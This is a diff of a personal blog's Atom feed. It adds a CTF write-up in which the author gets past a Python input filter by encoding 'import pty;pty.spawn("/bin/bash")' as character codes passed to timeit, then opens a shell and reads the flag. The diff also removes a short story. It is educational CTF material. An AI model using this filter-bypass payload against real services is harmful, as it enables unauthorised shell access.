@@ -1,4 +1,83 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2020-05-08T19:28:38+00:00</updated><id>/feed.xml</id><title type="html">Cheuk’s Blog</title><subtitle>Student • Programmer • Writer</subtitle><entry><title type="html">Taking advantage of output dumping for a Gradescope programming assignment</title><link href="/writeup/2020/05/08/gradescope-hw-exploits.html" rel="alternate" type="text/html" title="Taking advantage of output dumping for a Gradescope programming assignment" /><published>2020-05-08T00:00:00+00:00</published><updated>2020-05-08T00:00:00+00:00</updated><id>/writeup/2020/05/08/gradescope-hw-exploits</id><content type="html" xml:base="/writeup/2020/05/08/gradescope-hw-exploits.html">&lt;blockquote&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2020-05-27T03:44:03+00:00</updated><id>/feed.xml</id><title type="html">Cheuk’s Blog</title><subtitle>Student • Programmer • Writer</subtitle><entry><title type="html">Timed - tjctf</title><link href="/writeup/2020/05/26/timed-tjctf.html" rel="alternate" type="text/html" title="Timed - tjctf" /><published>2020-05-26T20:23:00+00:00</published><updated>2020-05-26T20:23:00+00:00</updated><id>/writeup/2020/05/26/timed-tjctf</id><content type="html" xml:base="/writeup/2020/05/26/timed-tjctf.html">&lt;p&gt;This one is a cool blacklist bypass. It’s pretty simple. You are presented a
+text interface asking you to enter a python command.&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;Type a command to time it!
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Trying some simple functions seem to work fine, but….&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;Type a command to time it!
+print(1)
+Runtime: 1.09672546387e-05
+
+Type a command to time it!
+import os
+Hey, no hacking!
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;…there seems to be a blacklist of characters that get screened before the
+command is run. We must obfuscate it somehow. By digging around, we can see
+exactly what is in the blacklist and what isn’t in the blacklist. Most
+peculiarly, &lt;code class=&quot;highlighter-rouge&quot;&gt;timeit&lt;/code&gt; is &lt;strong&gt;NOT&lt;/strong&gt; in the blacklist.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Sidenote: it is hinted that &lt;code class=&quot;highlighter-rouge&quot;&gt;timeit&lt;/code&gt; could be a possibility because it is
+visible in the source whenever we provide invalid python code for the program
+to execute.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;Type a command to time it!
+arst
+Traceback (most recent call last):
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  File &quot;/timed.py&quot;, line 36, in &amp;lt;module&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;    time1=t.timeit(1)
+  File &quot;/usr/lib/python2.7/timeit.py&quot;, line 202, in timeit
+    timing = self.inner(it, self.timer)
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  File &quot;&amp;lt;timeit-src&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, line 6, in inner
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;    arst
+NameError: global name 'arst' is not defined
+Runtime: 0
+
+Type a command to time it!
+12.,,
+Traceback (most recent call last):
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  File &quot;/timed.py&quot;, line 31, in &amp;lt;module&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;    t=timeit.Timer(res)
+  File &quot;/usr/lib/python2.7/timeit.py&quot;, line 129, in __init__
+    compile(setup + '\n' + stmt, dummy_src_name, &quot;exec&quot;)
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  File &quot;&amp;lt;timeit-src&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;, line 2
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;    12.,,
+        ^
+SyntaxError: invalid syntax
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can do something like the following in order to trick the program into
+executing blacklisted commands:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# We want to execute the following python
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;want_exec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# So we obfuscate it a bit
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obfuscated&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;want_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# and we can just reverse it using a join-map
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;want_exec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;obfuscated&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Payload:
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timeit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;105&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...])))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;By pasting the payload into the program, we get a shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;Type a command to time it!
+timeit(''.join(map(chr, [105, ...])))
+bash: /root/.bashrc: Permission denied
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;nobody@c51f99923c23:/$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;ls
+bin   dev  flag.txt  lib    media  opt   root  sbin  sys       tmp  var
+boot  etc  home      lib64  mnt    proc  run   srv   timed.py  usr
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;nobody@c51f99923c23:/$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
+&lt;span class=&quot;go&quot;&gt;cat flag.txt
+tjctf{iTs_T1m3_f0r_a_flaggg}
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="writeup" /><category term="ctf" /><category term="writeup" /><category term="python" /><summary type="html">This one is a cool blacklist bypass. It’s pretty simple. You are presented a text interface asking you to enter a python command.</summary></entry><entry><title type="html">Taking advantage of output dumping for a Gradescope programming assignment</title><link href="/writeup/2020/05/08/gradescope-hw-exploits.html" rel="alternate" type="text/html" title="Taking advantage of output dumping for a Gradescope programming assignment" /><published>2020-05-08T00:00:00+00:00</published><updated>2020-05-08T00:00:00+00:00</updated><id>/writeup/2020/05/08/gradescope-hw-exploits</id><content type="html" xml:base="/writeup/2020/05/08/gradescope-hw-exploits.html">&lt;blockquote&gt;
   &lt;p&gt;An old story I’ve been saving up.&lt;/p&gt;
 &lt;/blockquote&gt;
 
@@ -1020,38 +1099,4 @@ protein product). Genes that aren’t proteins don’t have this tag. Using this
 proteins.&lt;/p&gt;
 
 &lt;p&gt;Our research heavily used the locus tag of proteins, but not the protein
-product as much.&lt;/p&gt;</content><author><name></name></author><category term="bioperl" /><category term="bioperl" /><category term="perl" /><category term="bioinformatics" /><summary type="html">Using BioPerl, get subsets of a nucleotid sequence.</summary></entry><entry><title type="html">[Writing] Fire</title><link href="/writing/2017/06/28/cw-fire.html" rel="alternate" type="text/html" title="[Writing] Fire" /><published>2017-06-28T07:07:00+00:00</published><updated>2017-06-28T07:07:00+00:00</updated><id>/writing/2017/06/28/cw-fire</id><content type="html" xml:base="/writing/2017/06/28/cw-fire.html">&lt;p&gt;Cory noticed the ominous black smoke billowing outwards, and decided to run to
-safety. Sadly, his friends had other ideas.&lt;/p&gt;
-
-&lt;p&gt;“This will look great as my profile picture!” Dave smiled.&lt;/p&gt;
-
-&lt;p&gt;“We really need to go; can this wait until later?” reasoned Cory. “The
-building’s burning down!”&lt;/p&gt;
-
-&lt;p&gt;Cory grabbed the nook on his elbow and started to pull. His phone shook as he
-wailed like a 5-year-old having a fit at the mall.&lt;/p&gt;
-
-&lt;p&gt;“But the flair!” he protested.&lt;/p&gt;
-
-&lt;p&gt;He slapped the phone out of his grasp and caught it with his other hand. “Come
-get it!” he taunted. It was already getting difficult to breathe. He had to act
-fast. Without a shred of forethought, he flung the smartphone over Dave’s head
-and into the fire.&lt;/p&gt;
-
-&lt;p&gt;“Why did you do that? Now I have to buy a new one!”&lt;/p&gt;
-
-&lt;p&gt;Cory could wait no longer; he caught a whiff of black smoke. With the remainder
-of his energy, he grabbed him and slung him over his back, so that he looked
-like a weird Santa Claus. He pushed through the door and exited the premise….&lt;/p&gt;
-
-&lt;p&gt;Into a sea of flames. The entire room was burning. The flamboyant flames
-flickered, as if it was some kind of vivid, recurring nightmare. He took one
-look at the scene, and promptly turned backwards, and marched back into the
-room. His foot slyly clipped the door’s edge, shutting out most of the smoke. He
-put down the previously screaming load and went to the window. Dust and debris
-rained from somewhere above him. With his back facing the outside, he crossed
-his heart and leaned backwards.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;&lt;small&gt;20-minute story challenge; 270 words cursive.&lt;/small&gt;&lt;/p&gt;</content><author><name></name></author><category term="writing" /><category term="fire" /><category term="writing" /><category term="death" /><summary type="html">Cory noticed the ominous black smoke billowing outwards, and decided to run to safety. Sadly, his friends had other ideas.</summary></entry></feed>
+product as much.&lt;/p&gt;</content><author><name></name></author><category term="bioperl" /><category term="bioperl" /><category term="perl" /><category term="bioinformatics" /><summary type="html">Using BioPerl, get subsets of a nucleotid sequence.</summary></entry></feed>
